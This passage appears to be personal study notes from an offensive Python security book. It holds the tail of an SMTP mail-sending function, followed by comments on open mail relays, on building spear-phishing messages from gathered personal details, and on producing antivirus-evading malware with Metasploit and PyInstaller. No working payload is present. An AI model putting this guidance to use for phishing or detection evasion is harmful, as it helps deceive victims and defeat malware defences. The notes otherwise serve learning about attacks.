        smtp_server.ehlo()
        smtp_server.starttls()
        smtp_server.ehlo()
        smtp_server.login(user, password)
        print("[+] Logged into the mail server")
        smtp_server.sendmail(user, to, msg.as_string())
        smtp_server.close()
        print("[!] Mail sent successfully")

    except:
        print("[-] Sending mail failed")

# Many email servers are not open replayers and will only send mails
# to specific addresses. What scammers do is set up a local email server
# as open relay (or any open relay on the Internet), using which the To
# email addresses doesn't even have to be valid.

# Spear phishing - using social engineering to trick victims to clicking
# on malicious websites (it can be often designed to look like valid sites).
# Attackers lull victims through this familiarity and get them to provide
# their credentials. We could use all the functions we've written so far to
# find a person's location, interests, hashtags, and craft a dummy message
# using random choices.

#####################################################################
# Chapter 7
#####################################################################

# Antivirus engines failed to detect the virus Flame for years even though
# it was sophisticated. This chapter will go through the process of creating
# malware which goes undectected, which is trivial because most antivirus
# vendors still use the same signature-based detection as their go to.
# Metaspolit is a crafty little framework which generates malicious code
# for us. Pyinstaller can be used to convert python scripts to executables.

# The author goes through writing a script which uploads malware to a website
# and check whether it went by undetected. The way to do this is to send a
# post request and, while the status code isn't 302 (redirect), stay there.
